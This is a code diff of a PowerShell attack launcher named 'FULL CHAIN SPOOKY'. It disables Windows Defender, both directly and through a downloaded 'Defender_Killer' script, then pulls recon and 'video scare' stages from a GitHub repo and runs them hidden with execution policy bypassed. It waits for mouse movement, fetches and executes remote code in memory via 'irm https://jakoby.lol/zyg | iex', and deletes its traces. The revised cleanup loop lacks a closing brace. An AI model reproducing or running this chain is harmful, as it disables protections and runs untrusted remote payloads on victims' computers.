@@ -1,135 +1,87 @@
-# === Set Execution Policy for Session ===
+# Set Execution Policy to allow running scripts
 Set-ExecutionPolicy RemoteSigned -Scope Process -Force
 
-Write-Host "=== Starting FULL CHAIN SPOOKY Master Launcher ==="
+Write-Host "=== Starting FULL CHAIN SPOOKY FINAL SUPREME ==="
 
-# === FUNCTIONS ===
+# === DOWNLOAD STAGES ===
 
-# Try disabling Defender using normal method
-function Disable-Defender {
-    try {
-        Write-Host "Checking Windows Defender status..."
-        $defenderStatus = Get-MpPreference
-        if ($defenderStatus.DisableRealtimeMonitoring -eq $false) {
-            Write-Host "Defender real-time protection is ACTIVE. Attempting to disable..."
-            Set-MpPreference -DisableRealtimeMonitoring $true
-            Write-Host "Defender real-time protection disabled successfully!"
-        } else {
-            Write-Host "Defender real-time protection is already disabled."
-        }
-    } catch {
-        Write-Host "Standard Defender disable failed. Attempting hard disable next..."
-    }
-}
-
-# If normal Defender kill fails, attempt aggressive service shutdown
-function Force-DisableDefender {
-    try {
-        Write-Host "Attempting hard disable of Defender services..."
-        Stop-Service -Name "WinDefend" -Force
-        Set-Service -Name "WinDefend" -StartupType Disabled
-        Write-Host "Defender service stopped and disabled!"
-    } catch {
-        Write-Host "Could not force stop Defender service. May require SYSTEM privileges."
-    }
-}
-
-# === BEGIN ===
-
-# First try to disable Defender
-Disable-Defender
-
-# Then attempt hard disable if needed
-Force-DisableDefender
-
-# === DOWNLOAD AND EXECUTE STAGES ===
-
-# Define URLs for stages
 $urls = @(
-    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/Original_Recon", # Part 1 - Recon
-    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/video_scare.txt"  # Part 2 - Video scare
+    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/Original_Recon",         # Part 1 - Recon
+    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/video_scare.txt",         # Part 2 - Video scare
+    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/Defender_Killer"          # Defender killer
 )
 
-# Define temp paths for parts
 $tempPaths = @(
     "$env:TEMP\part1.ps1",
-    "$env:TEMP\part2.ps1"
+    "$env:TEMP\part2.ps1",
+    "$env:TEMP\Defender_Killer.ps1"
 )
 
-# Download Part 1 and Part 2
+# Download all files
 for ($i = 0; $i -lt $urls.Count; $i++) {
     Write-Host "Downloading Part $($i + 1)..."
-    try {
-        Invoke-WebRequest -Uri $urls[$i] -OutFile $tempPaths[$i] -UseBasicParsing -ErrorAction Stop
-        Write-Host "Downloaded Part $($i + 1) successfully."
-    } catch {
-        Write-Host "Failed to download Part $($i + 1). Exiting..."
-        exit
-    }
+    Invoke-WebRequest -Uri $urls[$i] -OutFile $tempPaths[$i] -UseBasicParsing -ErrorAction Stop
+    Write-Host "Downloaded Part $($i + 1) successfully."
 }
 
-# === EXECUTE STAGES ===
+# === CHECK DEFENDER STATUS ===
 
-# Run Part 1 (Recon script)
-Write-Host "Running Part 1 (Recon)..."
+Write-Host "Checking Windows Defender status..."
+
 try {
-    $process = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[0])`"" -PassThru
-    $process.WaitForExit()
-    Write-Host "Part 1 completed."
+    $defenderStatus = Get-MpPreference
+    if ($defenderStatus.DisableRealtimeMonitoring -eq $false) {
+        Write-Host "Defender is ACTIVE. Running custom Defender killer script..."
+        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[2])`"" -Wait
+        Write-Host "Custom Defender killer executed."
+    } else {
+        Write-Host "Defender already disabled. Continuing..."
+    }
 } catch {
-    Write-Host "Failed to run Part 1."
-    exit
+    Write-Host "Failed to check Defender status. Continuing anyway..."
 }
+
+# === EXECUTE CHAIN ===
+
+# Run Part 1 (Recon)
+Write-Host "Running Part 1 (Recon)..."
+Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[0])`"" -Wait
+Write-Host "Part 1 completed."
 
 # Wait for mouse movement
-Write-Host "Waiting for mouse movement before continuing..."
+Write-Host "Waiting for mouse movement..."
 Add-Type -AssemblyName System.Windows.Forms
 $initialPosition = [System.Windows.Forms.Cursor]::Position
 do {
     Start-Sleep -Milliseconds 500
     $currentPosition = [System.Windows.Forms.Cursor]::Position
 } while ($initialPosition.X -eq $currentPosition.X -and $initialPosition.Y -eq $currentPosition.Y)
-Write-Host "Mouse movement detected. Continuing."
+
+Write-Host "Mouse movement detected."
 
 # Run Part 2 (Video scare)
 Write-Host "Running Part 2 (Video scare)..."
-try {
-    $process = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[1])`"" -PassThru
-    $process.WaitForExit()
-    Write-Host "Part 2 completed."
-} catch {
-    Write-Host "Failed to run Part 2."
-    exit
-}
+Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[1])`"" -Wait
+Write-Host "Part 2 completed."
 
-# Small delay before AcidBurn start
-Write-Host "Waiting 2 seconds before launching AcidBurn..."
+# Buffer short wait
 Start-Sleep -Seconds 2
 
-# === Launch AcidBurn In-Memory (With Retry) ===
-
-Write-Host "Launching AcidBurn directly from memory..."
+# Launch AcidBurn (direct memory injection)
+Write-Host "Launching AcidBurn..."
 try {
     irm https://jakoby.lol/zyg | iex
-    Write-Host "AcidBurn script launched successfully!"
+    Write-Host "AcidBurn launched!"
 } catch {
-    Write-Host "First attempt to launch AcidBurn failed. Retrying after 3 seconds..."
-    Start-Sleep -Seconds 3
-    try {
-        irm https://jakoby.lol/zyg | iex
-        Write-Host "Second attempt successful!"
-    } catch {
-        Write-Host "Failed to launch AcidBurn even after retry. Skipping."
-    }
+    Write-Host "AcidBurn launch failed. Retrying..."
+    Start-Sleep -Seconds 2
+    irm https://jakoby.lol/zyg | iex
 }
 
-# === CLEANUP ===
-
-Write-Host "Cleaning up temporary files..."
+# Cleanup temp files
+Write-Host "Cleaning up temp files..."
 foreach ($script in $tempPaths) {
     Remove-Item -Path $script -Force -ErrorAction SilentlyContinue
-}
 
-Write-Host "All stages completed successfully. Exiting quietly."
-
+Write-Host "Mission complete. Exiting."
 exit
